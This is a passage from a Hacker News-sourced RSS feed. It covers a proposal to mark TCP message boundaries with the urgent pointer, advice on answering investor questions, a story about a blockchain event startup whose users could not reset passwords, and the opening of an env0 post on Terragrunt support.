(RFC 793 is confused about this - see <a href="http://www.rfc-editor.org/rfc/rfc1122.txt">RFC 1122</a>, section
4.2.2.4, for the correction); the receiving module can turn off the
urgency light once the client has read that byte.</p>

<p>For completeness, i should point out that the UP field in the TCP
header is actually only 16 bits long; it expresses the UP as an offset
from the sequence number of the packet. RFC 793 is cagey about what
happens when the UP is more than 65535 greater than the current sequence
number, but <a href="http://www.rfc-editor.org/rfc/rfc2147.txt" a="">RFC
2147</a> says, inter alia:</p>

<blockquote>When a TCP packet is to be sent with an Urgent Pointer
(i.e., the URG bit set), first calculate the offset from the Sequence
Number to the Urgent Pointer. If the offset is less than 65535, fill in
the Urgent field and continue with the normal TCP processing. If the
offset is greater than 65535, and the offset is greater than or equal to
the length of the TCP data [which it will be, unless you're dealing with
super-jumbograms], fill in the Urgent Pointer with 65535 and continue
with the normal TCP processing.</blockquote>

<p>Anyway, i propose abusing the urgent mechanism to mark the ends of
messages: the urgent pointer simply points to the end of the current
message. Rather than connecting this to buttons and lights, the
seqpacket-aware TCP module does the right thing with MSG_EOR: MSG_EOR
being set in send() causes the UP to be set, and hitting the UP when
doing recvmsg() causes it to set MSG_EOR. Simple!</p>

<p>There is one little problem, which is that you can't pack multiple
messages into a single TCP packet, since you wouldn't be able to have
the UP pointing at the ends of all of them. This is a shame, but not
that big a deal; the whole sequenced packet thing is about reasonably
big packets. If a burning need for multiple messages per packets was
felt, w e could specify a negotiable TCP option to hold additional
message-end pointers.</p>

<p>There is some degree of interaction between the mechanism i describe
and TCP's push function. The push function was specified in part so that
applications can indicate to the TCP module when they'd got to the end
of a block of data, so that it does not waste time waiting for more;
with explicit message boundaries, it can work this out itself. TCP
modules should send less-than-MTU packets when and only when a message
end is signalled; the rest of the time, they should wait for enough data
from the client to fill a complete packet, without any timeout. As well
as rendering the push function obsolete, explicit message boundaries
also make Nagle's algorithm unnecessary. The push function can, however,
be repurposed: explicit pushes can be applied to indicate that a message
should be delivered as quickly as possible (the push should be signalled
in the same send that delivers the end-of-message indication). The TCP
modules should then do everything they can to deliver the message
quickly, and should indicate to the user that the message was pushed. 
Both these interactions with the user can be mediated by a MSG_PUSH flag
in the send() or recvmsg() flags (and perhaps a MSG_PUSH_PENDING flag in
recvmsg(), to indicate that a message somewhere ahead is being pushed).
The push would be communicated in the TCP packets by the setting of the
PSH flag, as now. We might even enable out-of-order delivery of the
pushed message, but that would be very weird. In essence, we're swapping
the semantics of the push and urgent functions!</p>



</div>]]>
            </description>
            <link>http://urchin.earth.li/~twic/Sequenced_Packets_Over_Ordinary_TCP.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520332</guid>
            <pubDate>Wed, 23 Dec 2020 18:14:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to answer the top investor questions]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25520303">thread link</a>) | @StartupNow
<br/>
December 23, 2020 | https://www.zoimeet.com/213-investor-questions-and-how-to-answer-them/ | <a href="https://web.archive.org/web/*/https://www.zoimeet.com/213-investor-questions-and-how-to-answer-them/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-locker-id="3207">  <div data-id="ptsfwh" data-type="section"> <div data-id="pljmvg" data-type="container"> <div data-id="pq952q" data-type="row"> <div data-id="p2txam" data-type="column"> <div data-id="p2exhx" data-type="image">  <div><p><img width="1000" height="200" src="https://www.zoimeet.com/wp-content/uploads/2020/12/qcompany.png" alt="" loading="lazy" srcset="https://www.zoimeet.com/wp-content/uploads/2020/12/qcompany.png 1000w, https://www.zoimeet.com/wp-content/uploads/2020/12/qcompany-300x60.png 300w, https://www.zoimeet.com/wp-content/uploads/2020/12/qcompany-768x154.png 768w" sizes="(max-width: 1000px) 100vw, 1000px"></p></div> </div> <div data-id="pgblg8" data-type="accordion">  <div> <div> <div> <div> <div> <p>What does the company do?</p> </div>  </div> <div> <div> <div data-id="p37rt0" data-type="inner-row"> <div data-id="pwuprb" data-type="column"> <div data-id="pcznep" data-type="heading">  <div> <p>Your answer should be clear, concise, well constructed, and most importantly – keep it short! The answer to this questions should be one that you know, and you can provide with certainty and authentic conviction. Make use of the elevator pitch, excite the investor with an engaging answer that sparks their curiosity to learn more.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Why did you pick this idea to work on?</p> </div>  </div> <div> <div> <div data-id="pwj5nk" data-type="inner-row"> <div data-id="pzojfp" data-type="column"> <div data-id="pw9bdv" data-type="heading">  <div> <p>Again, keep your questions short and to the point during investor meetings. This is a great opportunity to explain your motivation as to why you are working on this. Make sure to convey clear reasons and back them up with some domain expertise or background experience that makes you the perfect team to work on this idea. don’t forget to express your enthusiasm and excitement your cary within to be bring this idea to life. Investors like to hear that you are passionate about what you do.</p> </div> </div> </div> </div> </div> </div> </div> <div>  <div> <div> <div data-id="pfrdpb" data-type="inner-row"> <div data-id="p76drh" data-type="column"> <div data-id="pcqqvd" data-type="heading">  <div> <p>The investor likes to know if you can prove that you have a truly unique value proposition. You have been working on this idea for a while now and did your research, you should definitely be able to explain properly how you differ from others in the market. First of all, express how you and your team are different than any other team to execute on this. Explain the in-house expertise, motivation, and amazing team collaboration to achieve results. Second, you found a unique solution to the customer’s problem through innovative (proprietary) technology, product development, or service offering unlike anything in the market today.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What big problem do you solve?</p> </div>  </div> <div> <div> <div data-id="p5m277" data-type="inner-row"> <div data-id="p729kq" data-type="column"> <div data-id="pwq1v6" data-type="heading">  <div> <p>When an investor asks you this question, get ready to emphasize clearly that the problem your solving is HUGE! You are on a mission to solve a problem that will change the way people do certain things and it will have a tremendous impact. Make sure to state some short key facts why this true so you’re not just blowing this up. The reason why you want to answer it in this way, is because the bigger the problem, the more likely people are willing to pay.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What is unique about the company?</p> </div>  </div> <div> <div> <div data-id="pswh74" data-type="inner-row"> <div data-id="pt3l1o" data-type="column"> <div data-id="prc0cw" data-type="heading">  <div> <p>Although this question ties in closely with “how are you different?” they are not entirely the same question. This is your opportunity to really focus on what makes your company unique. It might be your proprietary innovative technology that makes your company unique. It could be that your team has amazing set of skills unlike any other team. Or, it could be that your company strategized towards problems and opportunities just a bit different than others. Focus, focus, focus – let them know that <i>you know</i> what is unique about your company.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Why is your business defensible?</p> </div>  </div> <div> <div> <div data-id="pc026o" data-type="inner-row"> <div data-id="pg1ie5" data-type="column"> <div data-id="pf29xp" data-type="heading">  <div> <p>The investor is looking for some reassurance that your business and product/service is not one that will be copied easily. You defensibility could be your go-to-market strategy or scaling strategy. Defensibility could also come from the team you assemble or the technology you are building. Explain how your business is one that can’t be easily copied and executed. Even if the idea can be copied by another company, they will not have the team you have to execute successfully. There is and should always be a clear confident answer to this question.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What do you understand that others don’t?</p> </div>  </div> <div> <div> <div data-id="p4hpcs" data-type="inner-row"> <div data-id="pu9ezu" data-type="column"> <div data-id="pnji6p" data-type="heading">  <div> <p>You certainly did your market research, spoke to customers, or have a background in a certain industry or field that gave you an understanding of the problem or opportunity you are working on. Hone in on all of them and incorporate them into the core of your story as to why you understand what other’s do not.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Who do you want to be like?</p> </div>  </div> <div> <div> <div data-id="pyb2yg" data-type="inner-row"> <div data-id="peb0i8" data-type="column"> <div data-id="p41xv8" data-type="heading">  <div> <p>You don’t want to be like anyone else. You’re unique, different, and will do things better. However, this is great moment to give an example of a company you admire (wether in your field or not). It shows that you have a vision for a certain strategy, company culture, or execution. While explaining your likes about the other company, make sure to incorporate some clear examples of what you will adopt and do differently.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Who do you least want to be like?</p> </div>  </div> <div> <div> <div data-id="p11f39" data-type="inner-row"> <div data-id="pvu318" data-type="column"> <div data-id="pdd7ly" data-type="heading"> <div> <p>Don’t answer this question by badmouthing another company. Answer short and concise, you are not focussing on who you don’t want to be, you’re focussing on who you are going to be – a company destined for greatness.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Where are you headquartered?</p> </div>  </div> <div> <div> <div data-id="p3kubm" data-type="inner-row"> <div data-id="p9os0u" data-type="column"> <div data-id="p0x5r5" data-type="heading"> <div> <p>Are company is headquartered in [insert city, country state].</p> </div> </div> </div> </div> </div> </div> </div> <div>  <div> <div> <div data-id="pcex4u" data-type="inner-row"> <div data-id="pc6fbv" data-type="column"> <div data-id="p5j103" data-type="heading">  <div> <p>The answer is either <i>Yes</i>, or, <i>No</i>. If you’re profitable you share an exact figure of profit you made. If you’re not profitable, don’t turn this answer into a defensive statement as to why not. Instead, give a short answer as to when you expect to become profitable and why (letters of intent, speaking with clients that will convert soon etc…). However, do not lie or give vague answers as to when you expect profits. This will only complicate things later and will make you look like you failed when you don’t reach those conversions. It’s okay to mention some positive expectations, but, try to stay realistic.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>How do you define success for you and your company?</p> </div>  </div> <div> <div> <div data-id="pc94f2" data-type="inner-row"> <div data-id="pt4kbo" data-type="column"> <div data-id="pxdwlf" data-type="heading">  <div> <p>Investors want to invest in founders who are focused on a disruptive, game-changing products/services/ideas. Some founders are more than happy to exit early and cash-in. Other founders want to push their business to the absolute limit and become the next Bill Gates, Steven Jobs, or Elon Musk. Make sure to think about this question carefully before answering. You should know your vision and dream – don’t be afraid to dream big (but stay realistic).</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What’s an impressive thing you have done?</p> </div>  </div> <div> <div> <div data-id="pw0fvu" data-type="inner-row"> <div data-id="pr3ptt" data-type="column"> <div data-id="puyuef" data-type="heading">  <div> <p>Use this as an opportunity to hone in on an achievement that that may wow the investor. This could be a technological breakthrough your team accomplished, a partnership that will change the course</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What’s the worst thing that has happened?</p> </div>  </div> <div> <div> <div data-id="pblvmp" data-type="inner-row"> <div data-id="pspdpz" data-type="column"> <div data-id="pauwkd" data-type="heading">  <div> <p>Don’t lead this down a negative path with your answer. We all make mistakes, we live, and we learn. Use this as an opportunity to explain how lessons learned were translated into actions. Maybe you had a hit and miss with a product feature or communication failure with a client. Give a clear short example of what happened, how you overcame the “worst thing”, and put those learnings back into your team, product, or management.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>How is the company currently organized?</p> </div>  </div> <div> <div> <div data-id="p46rih" data-type="inner-row"> <div data-id="pa7sei" data-type="column"> <div data-id="pn11t5" data-type="heading">  <div> <p>Do you have a corporate pyramid hierarchy? Or are you running your business a bit more flat? This should be a simple answer in which you explain the structure of your management, team, and/or advisors. Maybe you can even give a short example of how communication works in the company and the culture of collaboration. Don’t forget to mention how decisions are made, who is involved in the decision making process, and why you chose this approach. Finally, are you all working from the same office or do you have a remote team. Simply give a short summary of how your company is organized.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What does the cap-table look like?</p> </div>  </div> <div> <div> <div data-id="pyxv9z" data-type="inner-row"> <div data-id="p5ncod" data-type="column"> <div data-id="pso2hl" data-type="heading">  <div> <p>The cleaner the better. Share your screen during your meeting to visualize if possible. Always have a cap-table overview ready and make sure you know exactly how to present and explain the cap-table. You should always be on top of the company ownership.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What is the distribution of equity between founders?</p> </div>  </div> <div> <div> <div data-id="p2uije" data-type="inner-row"> <div data-id="pp8scp" data-type="column"> <div data-id="pefr5e" data-type="heading"> <div> <p>Explain clear who owns what percentage of the company and why. Did one person bring in more experience, money, or a valuable network that lead to a higher percentage? Do you have a founders agreement that covers your equity distribution and vesting? And often forgotten, do you have any follow-up agreements that may change the equity distribution among founders when certain milestones are reached. It is not always said that once equity is distributed between founders that it remains that way (tip to look into if you’re just starting).</p> </div> </div> </div> </div> </div> </div> </div> <div>  <div> <div> <div data-id="p8vwei" data-type="inner-row"> <div data-id="plu81n" data-type="column"> <div data-id="p6eya0" data-type="heading">  <div> <p>Who registered the company? Is held privately, on your holding, or did someone else register it for you? Often this question is asked to see if you are the legal founder of the company to avoid any issues later. You know exaclty who registered the company so this should be an easy question to answer.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Where is the company registered?</p> </div>  </div> <div> <div> <div data-id="p7usb2" data-type="inner-row"> <div data-id="pf1pze" data-type="column"> <div data-id="pzdec5" data-type="heading">  <div> <p>This question is often asked to determine under which law you operate. Sometimes investors ask this question because they get certain tax benefits by investing in companies within their own country. No need to have a full elaborate answer, just say we are registered in [insert country].</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Have you incorporated, or formed any legal entity (like an LLC) yet?</p> </div>  </div> <div> <div> <div data-id="p15o4r" data-type="inner-row"> <div data-id="ppzkcw" data-type="column"> <div data-id="pl4es5" data-type="heading">  <div> <p>If you have not yet established a legal entity for your organization, better get on it before your investor meeting. You need a legal entity to engage in business, bank transfers, and taxes. No entity, often no deal.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Will you reincorporate as a US/EU/ASIA company?</p> </div>  </div> <div> <div> <div data-id="pej1dk" data-type="inner-row"> <div data-id="p4j1t2" data-type="column"> <div data-id="phzu0q" data-type="heading">  <div> <p>Some VCs might not invest in companies in Europe. Other’s might only invest in startups from Asia (taxes/market knowledge). It has to make sense for your company to incorporate in another country. You can always return the question to the investor and ask <i>We have not yet discussed that option internally, but why do you ask?</i>. If the response is “we only invest in companies incorporated in [insert country]” – your follow-up question should be <i> if I hear your correctly, you would be willing to invest in our startup if we are located in [insert country]?</i>. Always confirm if that would tick of one of the criteria boxes.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Is there an existing board or advisors?</p> </div>  </div> <div> <div> <div data-id="ppl5nu" data-type="inner-row"> <div data-id="p326r8" data-type="column"> <div data-id="p2f2of" data-type="heading"> <div> <p>Pre-seed or seed funded companies often do not have a board. Usually this comes with your Series A or when a bigger VC steps in that really wants a board to have some say into the operations. If you do not have one, you don’t have one – easy answer. As mentioned before, you could use …</p></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.zoimeet.com/213-investor-questions-and-how-to-answer-them/">https://www.zoimeet.com/213-investor-questions-and-how-to-answer-them/</a></em></p>]]>
            </description>
            <link>https://www.zoimeet.com/213-investor-questions-and-how-to-answer-them/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520303</guid>
            <pubDate>Wed, 23 Dec 2020 18:10:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Somethings are never meant to be invented]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25520238">thread link</a>) | @rukshn
<br/>
December 23, 2020 | https://ruky.me/2020/12/23/somethings-are-never-meant-to-be-invented-the-story-of-blockevent/ | <a href="https://web.archive.org/web/*/https://ruky.me/2020/12/23/somethings-are-never-meant-to-be-invented-the-story-of-blockevent/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Every few years there comes a technology that people get hyped about, everyone wants to be a specialist in that field because it appears to be the next big thing.</p>
<p>Between 2015-2019 this was largely about bitcoins and blockchain technology. Everyone wanted to be a specialist in blockchain technology. Bitcoin was booming, ICOs were happening to the left and right.</p>
<p>And people were trying to introduce/incorporate blockchain technology into everything they can get their hands on.</p>
<p>Yes sometimes blockchain technology can improve the existing system. However, when you try to introduce blockchain or any other technology into something that doesn’t require it,the results can be disastrous.</p>
<p>This is a story I wanted to write for a very long time, it was about a small startup called BlockEvent. A small startup that wanted to incorporate blockchain technology into event management.</p>
<p><em>Their website blockevent.tk is now not functioning, and I was unable to find a web archive snapshot. A mirror exists on a different domain, please check the footnotes.</em></p>
<p>Blockchain on event management has been there before BlockEvents. Smart ticketing and smart contracts are currently being used to improve the ticketing field and control pricing etc.</p>
<h2>BlockEvent</h2>
<p>BlockEvents wanted to make the whole event process a decentralized mechanism. From user data, to events, to registration, everything was supposed to be “decentralized” and was “not accessible” to and “not modifiable” by anyone.</p>
<p>According to the BlockEvent team, </p>
<blockquote><p>We made BlockEvent as a decentralized system. That means no central party can control this booking process and it will work without any third party involvement. </p><p>BlockEvent acts as a bridge between the organizers and the participants where organizers come and create events through our system, and participants can come and book their tickets. </p><p>The whole process is done through Public Blockchain.</p><p>… </p><p>Using the blockchain for user identity management is a whole new paradigm.</p><cite>BlockEvent on one of their Facebook posts, describing their system. </cite></blockquote>
<p>BlockEvent when initially started mainly hosted monthly blockchain event meetup events. However, their big break came in May 2019, during the annual Google I/O.</p>
<p>Google I/O event is celebrated in Sri Lanka every year, with local tech companies hosting events of their own, with local influencers, while live streaming the Google I/O event.</p>
<p>The selection process is a very completions, hundreds of people compete for few limited number of seats. These events are a good place to network and meet new friends in IT field. Plus you end up getting some cool swags.</p>
<p>In order to be selected to these events you need to show that you are a tech person, usually they check your GitHub page, blog or YouTube channel. And the tech company will select and send an invitation to whom they think are the most suitable to attend their events.</p>
<p>Until 2018, this was done by using a simple Google form or a regular website.</p>
<p>However, in 2019, one of the largest tech and telecom companies in Sri Lanka decided to use BlockEvents to host their Google I/O event.</p>
<p>Getting selected by a big company like them to manage their Google I/O event was big deal, because they host one of the largest I/O events in Sri Lanka. And BlockEvent can leverage this to opportunity to get bigger clients in future.</p>
<p>It was their make or break moment. They had to nail it, and if they failed then for a small startup like BlockEvent, the damage to their reputation is going to hurt them to a point where there is no return.</p>
<h2><strong>Disaster</strong> </h2>
<p>BlockEvent also in their description, said this,</p>
<blockquote><p>To ensure the user data privacy and security, <strong>we are not storing any user credentials or password</strong>[s] <strong>in our database. Even the user emails are stored as a hash. Only the users know their passwords </strong>and that will provide 100% control over your account actions. Even BlockEvent team can’t access your accounts. </p><cite>BlockEvent describing their system in a Facebook post</cite></blockquote>
<p>Since they were storing <strong>everything </strong>in the blockchain, they were not storing even user emails and passwords. This may sound as a good privacy focused system. But this will come to hurt BlockEvent in a very bad way.</p>
<p>Since no one else other than the people in monthly blockchain meetups knew about BlockEvents, like in any other new service, most people registering for the local Google I/O event used either throwaway passwords, or new passwords which they forgot or didn’t save.</p>
<p>This caused large number of people to forget their passwords. If we use a normal database to store user data, with no hashing, they would have been able to reset the user passwords.</p>
<p>However, since everything is stored in blockchain, and everything were hashed, this meant that there is no way to reset a user password. </p>
<p>This led to large number of people being locked out of their accounts, unable to create new accounts with the existing emails, and BlockEvent team unable to reset passwords.</p>
<p>This caused a wave of negative reviews on BlockEvent Facebook page and on social media. Some users demanded the organizers to go back to the old system of using a Google form for user registration.</p>
<p>BlockEvent finally responded to their users, they had no way to reseat the password. Unless you remember the password and login, or you are permanently locked out from using the account.</p>
<figure><img data-attachment-id="75" data-permalink="https://ruky.me/2020/12/23/somethings-are-never-meant-to-be-invented-the-story-of-blockevent/img_0045/" data-orig-file="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?fit=1536%2C1517&amp;ssl=1" data-orig-size="1536,1517" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_0045" data-image-description="" data-medium-file="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?fit=300%2C296&amp;ssl=1" data-large-file="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?fit=1024%2C1011&amp;ssl=1" loading="lazy" width="1024" height="1011" src="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=1024%2C1011&amp;ssl=1" alt="" srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=1024%2C1011&amp;ssl=1 1024w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=300%2C296&amp;ssl=1 300w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=768%2C759&amp;ssl=1 768w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?w=1536&amp;ssl=1 1536w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=1024%2C1011&amp;ssl=1 1024w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=300%2C296&amp;ssl=1 300w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=768%2C759&amp;ssl=1 768w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?w=1536&amp;ssl=1 1536w" data-lazy-src="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=1024%2C1011&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Large number of people were locked out from their accounts, unable to reset their passwords.</figcaption></figure>
<blockquote><p>Due to the rules of decentralization, we can’t reset your passwords as we are giving priority to user data and security. We already communicated this on registration [on sign up]. </p><p>To ensure the decentralization the same rule is applied by many other [b]lockchain projects and products all over the world.</p><cite>BlockEvent responding to the events on a Facebook page</cite></blockquote>
<p>BlockEvent also asked participants to send their personal details on Facebook and via a Google form, so they can manually arrange a way to send the gift pack to the participants.</p>
<p>Some of the users accused the selection process was also flawed and complained that some of the people who were less qualified to attend the event were selected over them.</p>
<p>All this led to irreplaceable damage on BlockEvent, and the Google I/O event didn’t happen due to the Easter Sunday bombings. </p>
<p>BlockEvent went into hiatus few months later, all thought they never mentioned that they are shutting down, their website went offline once their domain name expired. Possibly signaling the end of the startup that hoped to decentralize how we manage identity online.</p>
<h2><strong>Conclusion</strong> </h2>
<p>The title of the post is <strong>“Somethings are never meant to be invented”</strong>.</p>
<p>No matter how utopian the idea may sound like, guaranteeing 100% user privacy with everything stored on a blockchain, not even giving access to user email to the creators can have its own drawbacks.</p>
<p>And since we are all humans, and we all tend to make mistakes, there has to be a fail safe mechanism, that will keep things in check and can undo the mistakes when we make one.</p>
<p>Also a single use password is a very bad idea, not only that users can lose their passwords, but also in the event of a data breach, user handing over the password to a third party by a mistake, how can the service reset the passwords? There are so many scenarios where things can go wrong.</p>
<p>May be an idea like BlockEvent were never meant to be invented.</p>
<p><strong>The currently hyped up technology may not be ideal for your system and instead a time tested solution may be the answer that you’re looking for.</strong></p>
<h2>My thoughts</h2>
<p>When it comes to blockchain and cryptocurrency, I’m still open minded, at the same time but skeptical. I’m not yet ready to invest or build something on blockchain.</p>
<p>I still find it difficult to fully understand the idea of blockchain, what makes it different from a decentralized git repository? Why Git is easy to implement but blockchain is hard? </p>
<p>When it comes to BlockEvents, I think what they did was store the email and password both hashed on the blockchain, and when a user logs in, they match the submitted hashed email and hashed passwords against what’s stored in the blockchain, like we do it in a normal login system using a database, except the fact that we don’t hash the emails.</p>
<h4>Notes</h4>
<p><em>I’m not a blockchain expert, so I don’t know the exact reason why BlockEvent was not able to reset the passwords.</em></p>
<p><em>Was it because they didn’t know the emails because they were hashed, or was it because once you put some information to the blockchain it is immutable, or was it due to both?</em></p>
<p><em>At the time when I saw this in 2019, I thought it was due to the fact that data is immutable on the blockchain, but now at the time of writing I feel it was due to the fact that the emails were stored on the blockchain in hashed format.</em></p>
<p><em>I also don’t know what really caused so many people to lose their password, my assumption is that they used a throwaway password, or a new password which they forgot. But still this number of users getting locked out is still unexplained.</em></p>
<p><em>After further Googling I was able to find a mirror of the original website on another domain name http://blockevent.ml</em></p>
<p><em>I tried logging in using my BlockEvent account, but I also have forgotten my BlockEvent password, and now I’m also locked out.</em></p>
<ul><li>BlockEvent password forgot requests – <a href="https://m.facebook.com/pg/blockevent.live/reviews/">https://m.facebook.com/pg/blockevent.live/reviews/</a></li></ul>
</div></div>]]>
            </description>
            <link>https://ruky.me/2020/12/23/somethings-are-never-meant-to-be-invented-the-story-of-blockevent/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520238</guid>
            <pubDate>Wed, 23 Dec 2020 18:02:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Terragrunt Support in Env0]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25520196">thread link</a>) | @vtimd
<br/>
December 23, 2020 | https://www.env0.com/blog/terragrunt-release | <a href="https://web.archive.org/web/*/https://www.env0.com/blog/terragrunt-release">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="w-node-cb7b2f22b997-f84b1cb7"><div><p>Hello, env0 and Terragrunt fans alike! It’s new-feature-day, yet again! But this time, we have something really special for you. We’re giving you the ability to completely change the game on the Infrastructure as Code files that you use to deploy and manage environments with our platform! Introducing remote-run support for <a href="https://terragrunt.gruntwork.io/">Terragrunt</a> workflows, now available in <a href="http://env0.com/">env0</a>! Remote-run workflows allow for everyone on the team to be able to have visibility into the deployments of others on the team and removes the visibility issues of locally-run workflows. Also, env0 allows you to manage these environments from deploy to destroy. Running Terragrunt on env0 allows you to empower your workflows with <a href="https://docs.env0.com/docs/policies">Policies &amp; Governance</a> and <a href="https://docs.env0.com/docs/user-management">RBAC</a>.</p><p>But, what if you aren’t very familiar with Terragrunt and its benefits yet? Well, let’s talk about it!</p><p><em>Terragrunt is a thin wrapper that provides extra tools for keeping your configurations </em><a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself"><em>DRY</em></a><em> (</em><strong><em>D</em></strong><em>on’t </em><strong><em>R</em></strong><em>epeat </em><strong><em>Y</em></strong><em>ourself), working with multiple Terraform modules, and managing remote state.</em></p><p>But, what does keeping your configurations “dry” mean? Having dry configs allows you to sanitize your terraform configuration files for use in multiple environments at once. Let’s say your code looks like this:</p><blockquote>└── live<br> &nbsp; &nbsp;├── prod<br> &nbsp; &nbsp;│ &nbsp; ├── app<br> &nbsp; &nbsp;│ &nbsp; │ &nbsp; └── main.tf<br> &nbsp; &nbsp;│ &nbsp; ├── mysql<br> &nbsp; &nbsp;│ &nbsp; │ &nbsp; └── main.tf<br> &nbsp; &nbsp;│ &nbsp; └── vpc<br> &nbsp; &nbsp;│ &nbsp; &nbsp; &nbsp; └── main.tf<br> &nbsp; &nbsp;├── qa<br> &nbsp; &nbsp;│ &nbsp; ├── app<br> &nbsp; &nbsp;│ &nbsp; │ &nbsp; └── main.tf<br> &nbsp; &nbsp;│ &nbsp; ├── mysql<br> &nbsp; &nbsp;│ &nbsp; │ &nbsp; └── main.tf<br> &nbsp; &nbsp;│ &nbsp; └── vpc<br> &nbsp; &nbsp;│ &nbsp; &nbsp; &nbsp; └── main.tf<br> &nbsp; &nbsp;└── stage<br> &nbsp; &nbsp; &nbsp; &nbsp;├── app<br> &nbsp; &nbsp; &nbsp; &nbsp;│ &nbsp; └── main.tf<br> &nbsp; &nbsp; &nbsp; &nbsp;├── mysql<br> &nbsp; &nbsp; &nbsp; &nbsp;│ &nbsp; └── main.tf<br> &nbsp; &nbsp; &nbsp; &nbsp;└── vpc<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;└── main.tf</blockquote><p>Each one of the environments have multiple components. In a traditional Terraform environment, you would have multiple sets of the same configuration files, that are all almost the same, but you have to edit the specific config info for each of the different environments. With Terragrunt, you can have “remote terraform configurations” where you store the clean terraform files in a separate repo, and then just call on it in remotely from any place you need it, and only put the Terragrunt configs for each specific environment in their corresponding place.</p><blockquote>└── live<br> &nbsp; &nbsp;├── prod<br> &nbsp; &nbsp;│ &nbsp; ├── app<br> &nbsp; &nbsp;│ &nbsp; │ &nbsp; └── terragrunt.hcl<br> &nbsp; &nbsp;│ &nbsp; ├── mysql<br> &nbsp; &nbsp;│ &nbsp; │ &nbsp; └── terragrunt.hcl<br> &nbsp; &nbsp;│ &nbsp; └── vpc<br> &nbsp; &nbsp;│ &nbsp; &nbsp; &nbsp; └── terragrunt.hcl<br> &nbsp; &nbsp;├── qa<br> &nbsp; &nbsp;│ &nbsp; ├── app<br> &nbsp; &nbsp;│ &nbsp; │ &nbsp; └── terragrunt.hcl<br> &nbsp; &nbsp;│ &nbsp; ├── mysql<br> &nbsp; &nbsp;│ &nbsp; │ &nbsp; └── terragrunt.hcl<br> &nbsp; &nbsp;│ &nbsp; └── vpc<br> &nbsp; &nbsp;│ &nbsp; &nbsp; &nbsp; └── terragrunt.hcl<br> &nbsp; &nbsp;└── stage<br> &nbsp; &nbsp; &nbsp; &nbsp;├── app<br> &nbsp; &nbsp; &nbsp; &nbsp;│ &nbsp; └── terragrunt.hcl<br> &nbsp; &nbsp; &nbsp; &nbsp;├── mysql<br> &nbsp; &nbsp; &nbsp; &nbsp;│ &nbsp; └── terragrunt.hcl<br> &nbsp; &nbsp; &nbsp; &nbsp;└── vpc<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;└── terragrunt.hcl</blockquote><p>This kind of operation can be very helpful when you have a lot of different environments or very complex environments at scale. For more information on Terragrunt, check out 